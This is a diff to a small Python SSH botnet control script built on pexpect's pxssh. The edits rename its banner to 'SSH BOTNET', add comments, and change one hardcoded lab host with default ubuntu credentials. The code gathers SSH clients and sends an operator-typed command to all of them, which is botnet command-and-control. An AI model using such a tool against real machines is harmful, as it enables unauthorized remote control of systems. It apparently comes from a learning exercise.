@@ -7,9 +7,9 @@ from pexpect import pxssh
 os.system('cls' if os.name == 'nt' else 'clear')
 print('''
 ======================================
-THIS IS A SIMPLE SSH BOT CONTROL UNIT.
+            SSH BOTNET
 --------------------------------------
-        Coded by CyberCommands
+               2022
 ======================================''')
 
 class Client:
@@ -43,8 +43,8 @@ def add_client(host, user, password):
     client = Client(host, user, password)
     Botnet.append(client)
 
-order = input("Command >> ")
-Botnet = []
-add_client('192.168.29.130', 'ubuntu', 'ubuntu')
+order = input("Command >> ")# nhap command
+Botnet = [] #create list
+add_client('192.168.80.129', 'ubuntu', 'ubuntu') #goi add_client func
 #add_client('host', 'username', 'password')
 botnet_command(order)
